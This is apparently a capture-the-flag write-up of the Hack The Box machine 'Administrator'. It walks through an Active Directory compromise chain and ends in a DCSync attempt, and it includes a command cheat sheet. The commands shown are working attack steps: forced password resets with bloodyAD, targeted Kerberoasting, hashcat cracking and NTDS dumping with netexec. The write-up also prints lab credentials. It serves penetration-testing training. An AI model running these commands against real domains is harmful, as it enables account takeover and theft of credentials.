---
title: "Writeup: HTB Administrator – Pure Active Directory, Bloodhound, and bloodyAD"
date: 2026-09-23 16:00:00 +0200
categories: [writeups]
tags: [cpts-prep, AD, bloodhound, bloodyad, kerberoasting, hashcat]
description: The perfect proving grounds to sharpen your AD enumeration, Bloodhound, and bloodyAD skills
media_subpath: /assets/img/posts/administrator/
---

## Introduction
![](administrator-0.png)

Welcome to my writeup on the box Administrator. By the end of this post, you will have a better understanding of AD attacks, a [cheat sheet](#cheat-sheet-of-commands-used-in-this-writeup) of all commands used in this writeup and a small collection of basic level methodology steps – relevant to this writeup.
#### Who this writeup is for and your assumed knowledge
The post is written for someone, who has learned, or is still learning the fundamentals of pentesting – like someone working on the CPTS path – going through concepts like initial enumeration of exposed services / ports.
You should possess a basic understanding of Active Directory, as well as basic ad enumeration and attack methods. Otherwise this post will likely be more confusing than helpful to you. If you feel like – while reading – that most of what you are reading is completely foreign to you, it might be worth exploring the fundamentals of each topic first, so you gain more out of this writeup.

#### What to expect and find in this writeup
Besides the main part of the writeup, I've tried to include steps that emphasize essential enumeration methodology steps, like re-enumerating services with newly gained users, so you hopefully get a better feel for how thorough enumeration works.

I also included a [cheat sheet of all commands](#cheat-sheet-of-commands-used-in-this-writeup) and [simple methodology steps used](#simple-methodology-steps-used) of this post, so you can look it up later, or add these commands and methodology steps to your own notes.

### cheat sheet of commands used in this writeup
```console
# default nmap scan
sudo nmap -sCV 10.129.72.5 -oN nmap/default_nmap.out

# run rusthound-ce for data collection
(-d $domain = must be IP of target in /etc/hosts)
rusthound-ce -d $domain -u $user -p $pass -c All -z

----------

# bloodyAD
## bloodyAD help menu, get detailed options for each step
bloodyAD --help
bloodyAD set --help
bloodyAD set password --help

## change password of a user
bloodyad --host $host --domain $domain -u $user -p $pass set password target_user new_password

----------

# perform targeted kerberoast attack
targetedKerberoast -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user ethan

# hashcat
## crack passwordsafe v3 files
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt 

## crack kerberoast hash
hashcat -m 13100 ethan_kerberoast_hash /usr/share/wordlists/rockyou.txt

----------

# netexec commands
## check authentication against SMB
nxc smb $host -u $user -p $pass

## perform DCsync attack on Domain Controller / get ntds.dit content
nxc smb $host -u $user -p $pass --ntds

## execute commands via SMB
nxc smb $host -u $user -p $pass -x 'whoami'

## check authentication against FTP
nxc ftp $host -u $user -p $pass

## list files in FTP share
nxc ftp $host -u $user -p $pass --ls

## upload file via FTP
nxc ftp $host -u $user -p $pass --put test.txt test.txt

## download file via FTP
nxc ftp $host -u $user -p $pass --get file.txt
```


### simple methodology steps used
While very surface level, I still think keeping it simple here is most beneficial for a writeup since this is not a methodology deep dive.
I only included the methodology steps taken from the writeup, not from general concepts.

#### Checks to do for each compromised user
- special SMB shares
- FTP access 
- Bloodhound: Outbound object control
- Bloodhound: Special group memberships
#### AD user discovery compromise, bloodhound methodology
- collect `bloodhound` data with compromised account 
	- using `rusthound-ce` or `bloodhound-python-ce`
	- Note: this only needs to be done once per domain. Re-enumerating with a newly compromised user **will not** give you new bloodhound data.
	
- Add newly compromised users to "`Add to Owned`".
- Check `outbound object control` entries of compromised user.
- Check `group membership` of compromised user.

### Administrator short summary
Administrator is a great box to practice your bloodhound and bloodyAD skills.
You will attack a Domain controller with a set of credentials to start off. By collecting and investigating `bloodhound` data, you discover that your starting user is able to modify the password of a user, which in turn can modify another user's password. That user has privileges to access the `FTP` service, where you will find a `passwordsafe v3` file. Initial access is denied, due to a password requirement. You crack the master password via `hashcat`, access the `passwordsafe` file, and discover credentials for the next user. That user has `GenericWrite` over the final user, which you gain access to by performing a `targeted Kerberoast` attack. With the final user under control, you perform a `DCSync` attack, which grants you the hashes of all user's in the domain, including the domain admin and thus full domain compromise.

---

## Start of the writeup
Since this is an assumed breach scenario – as is common in real pentests – we get handed a "compromised" user to simulate an attacker entering the network, through methods like phishing:
```console
olivia:ichliebedich
```

To keep track of your compromised accounts, it's good hygiene to maintain a sort of `creds.txt` file which you update with newly gained credentials, upon compromise.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ cat creds.txt
olivia:ichliebedich
```

A quick check via `nxc` confirms that the provided credentials are working:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator.htb -u olivia -p ichliebedich
SMB         10.129.72.5     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.5     445    DC               [+] administrator.htb\olivia:ichliebedich
```

An initial nmap sets the state clear: we are dealing with a Domain controller.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ sudo nmap -sCV 10.129.72.5 -oN nmap/defaul_nmap.out
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-20 19:34 +0200
Nmap scan report for 10.129.72.5
Host is up (0.087s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-21 00:34:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-21T00:34:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.18 seconds

```
Telltale signs that this is a domain controller are: `Kerberos 88, SMB 445, LDAP 636`. 
Port `21 FTP` is unusual on a DC. `WinRM` is enabled, so we can check for `evil-winrm` access with compromised accounts.

Through the nmap LDAP scripts, we find out the `machine` and `domain name`, which is `administrator` and `administrator.htb` respectively.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ sudo nano /etc/hosts


10.129.72.5     administrator     administrator.htb
```


Before diving in – a quick check to see if `olivia` has access to special smb shares, or access to the FTP service:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u olivia -p ichliebedich --shares
SMB         10.129.73.61    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.73.61    445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.129.73.61    445    DC               [*] Enumerated shares
SMB         10.129.73.61    445    DC               Share           Permissions            Remark
SMB         10.129.73.61    445    DC               -----           -----------            ------
SMB         10.129.73.61    445    DC               ADMIN$                                 Remote Admin
SMB         10.129.73.61    445    DC               C$                                     Default share
SMB         10.129.73.61    445    DC               IPC$            READ                   Remote IPC
SMB         10.129.73.61    445    DC               NETLOGON        READ                   Logon server share 
SMB         10.129.73.61    445    DC               SYSVOL          READ                   Logon server share 

┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc ftp administrator -u olivia -p ichliebedich  
FTP         10.129.72.143   21     administrator    [*] Banner: Microsoft FTP Service
FTP         10.129.72.143   21     administrator    [-] olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)
```
Negative on both.


>**enumeration methodology change on assumed breach**
>
>When having an assumed breach scenario, I keep the unauthenticated enumeration steps for when I am stuck, so no anon or guest account enumeration for now.
{: .prompt-info }

---
## Bloodhound enumeration 
### initial enumeration via Olivia
When having access to an Active Directory user, bloodhound is an invaluable tool, to kick off your initial enumeration.
First, we need to collect data for bloodhound to analyze, which we can later analyze in the web GUI.
My choice here is [rusthound-ce](https://github.com/g0h4n/RustHound-CE) but you can also use the well known [bloodhound-python-ce](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce).
I run the following command, using the creds for `olivia`:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ rusthound-ce -d administrator.htb -u olivia -p ichliebedich -c All -z                         
---------------------------------------------------
Initializing RustHound-CE at 19:43:21 on 09/20/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-20T17:43:21Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-20T17:43:21Z INFO  rusthound_ce] Collection method: All
[2026-09-20T17:43:21Z INFO  rusthound_ce::ldap] Connected to ADMINISTRATOR.HTB Active Directory!
[2026-09-20T17:43:21Z INFO  rusthound_ce::ldap] Starting data collection...
<SNIP>

[2026-09-20T17:43:27Z INFO  rusthound_ce::json::maker::common] .//20260920194327_administrator-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 19:43:27 on 09/20/26! Happy Graphing!

```

To analyze the collected data, I start my bloodhound-ce server. Kali has made it VERY simple and easy to setup bloodhound yourself. Check instructions for kali [here](https://www.kali.org/tools/bloodhound/). If you are not on kali, check [this resource.](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ bloodhound-start                                                    
Starting neo4j
Neo4j is not running.
<SNIP>
There may be a short delay until the server is ready.
.............................................

┏━(Message from Kali developers)
┃ 
┃ Please wait for the bloodhound service to start
┃ ......
┃ [*] Web UI: http://127.0.0.1:8080
┃ [i] You might need to refresh your browser once it opens
┃ 
┗━

```

Once logged in, I upload the collected data (the zip file) and wait for it to fully ingest/analyze.
![](administrator-1.png)

after a short while, data got ingested, 
I search for our initial user `olivia` and mark this account as owned:
![](administrator-2.png)
![](administrator-3.png)
### bloodhound – ACE investigation
The whole chain starts here: look for `Outbound Object Control` entries for your compromised user and see what capabilities the user possesses. 

Checking `Outbound Object Control` of olivia reveals ACE on michael.
![](administrator-4.png)

Olivia has `GenericAll` over Michael. Clicking on `GenericAll` reveals more information provided by bloodhound:
![](administrator-5.png)
![](administrator-6.png)

In short, `GenericAll` grants us full control over the user.

The `Linux abuse` section shows some recommendations on how to utilize those access rights:
![](administrator-7.png)

I will decide to change the password of `michael`.
Though instead of using `net rpc` – as shown in the "Force Change Password" section – I will instead opt for a new and very handy tool called [bloodyAD](https://github.com/CravateRouge/bloodyAD), which is a sort of swiss army knife for active directory privilege escalation.

Though before diving in, we should investigate the chain further, to see what outcome awaits us.

Investigating the michael user, we discover that `michael` has `ForceChangePassword` rights over `benjamin`.
Repeating the same steps (select michael, check `Outbound Object Control`), I discover that `michael` has `ForceChangePassword` over `benjamin`.
![](administrator-8.png)

Further investigating the chain, the `benjamin user` has outbound rights over... nothing; The chain ends here.
![](administrator-9.png)

At this point, it is worth checking what groups `benjamin` is in.
![](administrator-10.png)

A quick check reveals, that `benjamin` is in the `Share Moderators Group` which is not a default active directory group. It looks like a purposefully created group.
![](administrator-11.png)


>**How to tell if an active directory group or user is custom or built in?**
{: .prompt-info }

To verify my claim, we can check the Object ID in bloodhound.
![](administrator-12.png)

What we are looking at, is the SID: ``S-1-5-21-1088858960-373806567-254189436-1111``
The SID consists of two major parts:
- domain identifier: `S-1-5-21-1088858960-373806567-254189436`
- RID: `1111` 
For us, the RID is relevant. In active directory environments, RIDs below 1000 are reserved for built in active directory groups. the `Share Moderators` has the RID of 1111 – non default group.

Chances are, that members of this group will have access to either special SMB shares, *or perhaps the FTP service*, that we were unable to access so far.

For now, it seems like `benjamin` is our most valuable target.

>**but don't neglect enumerating the other users.**
>
>While `benjamin` is the main target we should do our due diligence and still perform basic enumeration steps with each user we compromise, as we never know if and where decisive information may be hidden. A quick check on SMB shares and FTP won't take much time.
{: .prompt-warning}



To better visualize attack paths, we can use the `PATHFINDING` functionality inside bloodhound, set our starting and target user – olivia and benjamin respectively:

![](administrator-13.png)

This presents us with the full path we need to chase down:
![](administrator-14.png)

Let's get control over `michael`.

---
## Getting access to michael
Olivia has `GenericAll` over michael. In other words, `olivia` has full control over the `michael` account.

I will go the password change route, using [bloodyAD](https://github.com/CravateRouge/bloodyAD) to execute each step.
![](administrator-5.png)

### Changing password of michael
`BloodyAD` can be tricky in the beginning, especially if you are still learning Active Directory in general. I certainly did struggle with it.
A helpful way to figure out the syntax, is to utilize `--help` after each step of the syntax – here is what I mean:

```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ bloodyad --host administrator -d administrator.htb -u olivia -p ichliebedich \
--help             
usage: bloodyad [-h] [-d DOMAIN] [-u USERNAME] [-p PASSWORD] [-k [KERBEROS ...]]
                [-f {b64,hex,aes,rc4,default}] [-c [CERTIFICATE]] [-s] -H HOST [-i DC_IP] [--dns DNS]
                [-t TIMEOUT] [--gc] [-v {QUIET,INFO,DEBUG,TRACE}] [--json]
                {add,get,msldap,remove,set} ...

AD Privesc Swiss Army Knife

<SNIP>

Commands:
  {add,get,msldap,remove,set}
    add                 [ADD] function category
    get                 [GET] function category
    msldap              [MSLDAP] function category
    remove              [REMOVE] function category
    set                 [SET] function category

```
Here the `set` function looks like what we need.
Next, calling the `--help` option for `set`:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ bloodyad --host administrator -d administrator.htb -u olivia -p ichliebedich set --help                                         
usage: bloodyad set [-h] {object,owner,password,restore} ...

options:
  -h, --help            show this help message and exit

set commands:
  {object,owner,password,restore}
    object              Add/Replace/Delete target's attribute
    owner               Changes target ownership with provided owner (WriteOwner permission required)
    password            Change password of a user/computer
    restore             Restore a deleted objec
```

`password` looks right. Now let's see what options `password` has:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ bloodyad --host administrator -d administrator.htb -u olivia -p ichliebedich set password --help
usage: bloodyad set password [-h] [--oldpass OLDPASS] [--stealth] target newpass

positional arguments:
  target             sAMAccountName, DN or SID of the target
  newpass            new password for the target

options:
  -h, --help         show this help message and exit
  --oldpass OLDPASS  old password of the target, mandatory if you don't have "change password"
                     permission on the target (default: None)
  --stealth          disable password policy check when password change is denied (default: False)

```
and so on, you get the gist.

I change `michael`'s password to something more or less secure:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ bloodyad --host administrator -d administrator.htb -u olivia -p ichliebedich set password michael 'gig4-p4ssGG'                 
[+] Password changed successfully!
                                                                                                       
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator.htb -u michael -p 'gig4-p4ssGG'
SMB         10.129.72.5     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.5     445    DC               [+] administrator.htb\michael:gig4-p4ssGG
```
Verifying the credentials with `netexec` shows that our change was successful.

Don't forget to add `michael`'s  creds to `creds.txt`:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ cat creds.txt
olivia:ichliebedich
michael:gig4-p4ssGG

```

A quick check on `michael`'s access to smb shares and FTP reveals nothing interesting:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc ftp administrator -u michael -p 'gig4-p4ssGG'  
FTP         10.129.73.61    21     administrator    [*] Banner: Microsoft FTP Service
FTP         10.129.73.61    21     administrator    [-] michael:gig4-p4ssGG (Response:530 User cannot log in, home directory inaccessible.)
                                                                                                       
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u michael -p 'gig4-p4ssGG' --shares
SMB         10.129.73.61    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.73.61    445    DC               [+] administrator.htb\michael:gig4-p4ssGG 
SMB         10.129.73.61    445    DC               [*] Enumerated shares
SMB         10.129.73.61    445    DC               Share           Permissions            Remark
SMB         10.129.73.61    445    DC               -----           -----------            ------
SMB         10.129.73.61    445    DC               ADMIN$                                 Remote Admin
SMB         10.129.73.61    445    DC               C$                                     Default share                                                                                                      
SMB         10.129.73.61    445    DC               IPC$            READ                   Remote IPC
SMB         10.129.73.61    445    DC               NETLOGON        READ                   Logon server share                                                                                                 
SMB         10.129.73.61    445    DC               SYSVOL          READ                   Logon server share
```
Negative on both.

---
## Getting access to benjamin
Through `michael` having `ForceChangePassword` over `benjamin`, we will change his password too and thereby gain access:
![](administrator-8.png)

Here I'll use the same `bloodyAD` command from earlier:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ bloodyad --host administrator -d administrator.htb -u michael -p gig4-p4ssGG set password benjamin om3g4-p4ssGG
[+] Password changed successfully!
```
Verify that our password change applied:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u benjamin -p om3g4-p4ssGG
SMB         10.129.72.143   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.143   445    DC               [+] administrator.htb\benjamin:om3g4-p4ssGG
```

Success. Adding benjamin creds to `creds.txt`:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ cat creds.txt
olivia:ichliebedich
michael:gig4-p4ssGG
benjamin:om3g4-p4ssGG
```

Before diving into FTP, let's quickly check if benjamin has access to special smb shares too:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u benjamin -p om3g4-p4ssGG --shares
SMB         10.129.73.61    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.73.61    445    DC               [+] administrator.htb\benjamin:om3g4-p4ssGG 
SMB         10.129.73.61    445    DC               [*] Enumerated shares
SMB         10.129.73.61    445    DC               Share           Permissions            Remark
SMB         10.129.73.61    445    DC               -----           -----------            ------
SMB         10.129.73.61    445    DC               ADMIN$                                 Remote Admin
SMB         10.129.73.61    445    DC               C$                                     Default share                                                                                                      
SMB         10.129.73.61    445    DC               IPC$            READ                   Remote IPC
SMB         10.129.73.61    445    DC               NETLOGON        READ                   Logon server share                                                                                                 
SMB         10.129.73.61    445    DC               SYSVOL          READ                   Logon server share
```
Negative. Let's move on to FTP.
### Pillaging FTP share
Through our earlier bloodhound enumeration, we discovered that `benjamin` is in the `Share Moderators` group, which highly indicates that either additional `SMB shares` or the `FTP` service is meant. Since the `SMB share` check revealed nothing new, chances are benjamin is our way in to access the `FTP` shares:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc ftp administrator -u benjamin -p om3g4-p4ssGG
FTP         10.129.72.143   21     administrator    [*] Banner: Microsoft FTP Service
FTP         10.129.72.143   21     administrator    [+] benjamin:om3g4-p4ssGG
```
This confirms our suspicions:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc ftp administrator -u benjamin -p om3g4-p4ssGG
FTP         10.129.72.143   21     administrator    [*] Banner: Microsoft FTP Service
FTP         10.129.72.143   21     administrator    [+] benjamin:om3g4-p4ssGG
```

So let's investigate the FTP server.
A few things you should always check once you find an FTP server:
- check if you can upload.
- see what files you have access to.

Can we upload files?
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc ftp administrator -u benjamin -p om3g4-p4ssGG --put test.txt test.txt
FTP         10.129.72.143   21     administrator    [*] Banner: Microsoft FTP Service
FTP         10.129.72.143   21     administrator    [+] benjamin:om3g4-p4ssGG
FTP         10.129.72.143   21     administrator    [-] Failed to upload file. Response: (550 Access is denied. )
```
 Negative.
Are there any files we can access?
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc ftp administrator -u benjamin -p om3g4-p4ssGG --ls 
FTP         10.129.72.143   21     administrator    [*] Banner: Microsoft FTP Service
FTP         10.129.72.143   21     administrator    [+] benjamin:om3g4-p4ssGG
FTP         10.129.72.143   21     administrator    [*] Directory Listing
FTP         10.129.72.143   21     administrator    10-05-24  09:13AM                  952 Backup.psafe3  
```
`Backup.psafe3` looks promising.

Let's download and investigate it:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc ftp administrator -u benjamin -p om3g4-p4ssGG --get Backup.psafe3    
FTP         10.129.72.143   21     administrator    [*] Banner: Microsoft FTP Service
FTP         10.129.72.143   21     administrator    [+] benjamin:om3g4-p4ssGG
FTP         10.129.72.143   21     administrator    [+] Downloaded: Backup.psafe3

```

---
## Getting access to emily
### accessing passwordsafe file
through googling or using `file` against the password safe, we figure out that we are dealing with `Password Safe V3`:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ file Backup.psafe3 
Backup.psafe3: Password Safe V3 database
```
![](administrator-15.png)

So we need the proper tool to access it.
#### install via kali apt
Looks like the kali apt repo already contains the password safe package.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ apt search passwordsafe
passwordsafe/kali-rolling 1.22.0+dfsg-1 amd64
  Simple & Secure Password Management

passwordsafe-common/kali-rolling,now 1.22.0+dfsg-1 all [installed,auto-removable]
  architecture independent files for Password Safe
```

So let's install it.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ sudo apt install passwordsafe -y
```

#### alternative: install via github + dpkg
If you are not on kali or your package manager does not contain the passwordsafe package, you can opt to install it via `git download` and `dpkg` instead.

A quick search reveals the right github repo.
![](administrator-16.png)
![](administrator-17.png)

I had to search for "non-windows" as the standard downloads were not for Linux:
![](administrator-18.png)

![](administrator-19.png)

```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ sudo dpkg --install passwordsafe-debian13-1.25-amd64.deb
```

#### extracting credentials from passwordsafe file
Let's start the tool to see if we can access the password safe file.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ pwsafe      
```

![](administrator-20.png)

![](administrator-21.png)

![](administrator-22.png)

It looks like it wants a password to access – I mean obviously, but you never know..
Let's try cracking the password to access its content.
#### cracking the pwsafe master password
It seems like hashcat supports cracking pwsafe files:
![](administrator-23.png)

I'll use `rockyou.txt` to attempt cracking the file... and we get a hit.
```
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt         
hashcat (v7.1.2) starting

<SNIP>

Backup.psafe3:tekieromucho
```

![](administrator-24.png)

Three users. I'll verify each of the credential pairs via netexec, to see which are valid.
![](administrator-25.png)

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u alexander -p 'UrkIbagoxMyUGw0aPlj9B0AXSea4Sw'
SMB         10.129.72.143   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.143   445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
                                                                                                       
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'    
SMB         10.129.72.143   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.143   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
                                                                                                       
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u emma -p 'WwANQWnmJnGV07WQN8bMS7FMAbjNur'
SMB         10.129.72.143   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.143   445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
```
Only emily works.

Add emily creds to `creds.txt`
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ cat creds.txt
olivia:ichliebedich
michael:gig4-p4ssGG
benjamin:om3g4-p4ssGG
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

A quick check on Emily's access to smb shares and ftp revealed nothing new.

Adding emily to `owned` in bloodhound:
![](administrator-26.png)



Checking Emily's group memberships reveals, that this account is a member of `Remote Management Users`, so getting a shell via `evil-winrm` should likely work:
![](administrator-27.png)


We successfully established a shell.
Grabbing `user.txt` quickly:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ evil-winrm -i administrator -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                                        
Evil-WinRM shell v3.9

<SNIP>

*Evil-WinRM* PS C:\Users\emily\Documents> cat ..\Desktop\user.txt
c7b528d<REDACTED>
```

---
## Getting access to ethan
Investigating the `outbound object control` entries of Emily reveals `GenericWrite` over Ethan.
![](administrator-28.png)

Ethan in turn can perform a `DCSync` attack, aka dump hashes of all domain users – including the domain admin. This is our target.
![](administrator-29.png)

Let's see what `GenericWrite` enables us to do.
![](administrator-30.png)

it enables us to perform a targeted kerberoast attack.
![](administrator-31.png)

so the attack path is clear:
![](administrator-32.png)
### Performing targeted Kerberoast against ethan
The most handy tool I know for that case – and as suggested by bloodhound – is [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast). The same could be done with bloodyAD, but I'll choose the former here.

The easiest way to install `targetedKerberoast` is via `pipx`:
```console
$ pipx install git+https://github.com/ShutdownRepo/targetedKerberoast
```
What will be performed in short: The tool will set a fake SPN for the `ethan` user, which in turn allowed us to perform a normal kerberoast attack on it.

Let's perform a targeted kerberoast attack against `ethan`.
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ targetedKerberoast -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \
> --request-user ethan
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

ah.. classic, the *clock skew error*.
Kerberos is very sensitive to time synchronization between the client and the server. As seeing the clock skew error means that our time is off by more than 5 minutes from the Domain controller.

We have to sync our time with that of the domain controller:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ sudo ntpdate administrator.htb                        
[sudo] password for kali: 
2026-09-22 19:14:14.614316 (+0200) +126523.400184 +/- 0.009638 administrator.htb 10.129.72.143 s1 no-leap
CLOCK: time stepped by 126523.400184
CLOCK: time changed from 2026-09-21 to 2026-09-22
```

now it runs:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ targetedKerberoast -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \
--request-user ethan
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$0a3ce978508c<SNIP>
49071faa6e57537c638e2a2bf0bcea27e45006ab9e062acc3a0726621813f578f8b42c1fdab06a3c7abc9c1c7e7b7a8891adb5e215b327ccd5db907e614868b8a18d4d68bc6d39fc7ed2cbeaaa927b5e91727418359af2e5c86fe2f59747c64074678

```
We get a crackable hash for ethan.

I'll add the hash to a file, and crack with hashcat:

>**Prevent copy paste errors:**
>
>start copying from the very beginning of the hash: `$krb5tgs$23$*ethan$ADMINISTRATOR.HTB`)
{: .prompt-warning}

```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ hashcat -m 13100 ethan_kerberoast_hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

<SNIP>

:limpbizkit
```
Seems like it worked.

Let's verify the creds:
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u ethan -p limpbizkit                     
SMB         10.129.72.143   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.143   445    DC               [+] administrator.htb\ethan:limpbizkit
```
Checkpoint. 

## DCsync Attack
With access to `ethan`, the last step for us is to seize full control over the domain, by performing a DCsync attack against the domain controller, thus getting the NTLM hash of every single account, including the domain administrator.
### DCsync attack – netexec
```console
┌──(kali㉿kali)-[~/obsidian_vault/htb/administrator]
└─$ nxc smb administrator -u ethan -p limpbizkit --ntds
SMB         10.129.72.143   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.72.143   445    DC               [+] administrator.htb\ethan:limpbizkit 
SMB         10.129.72.143   445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
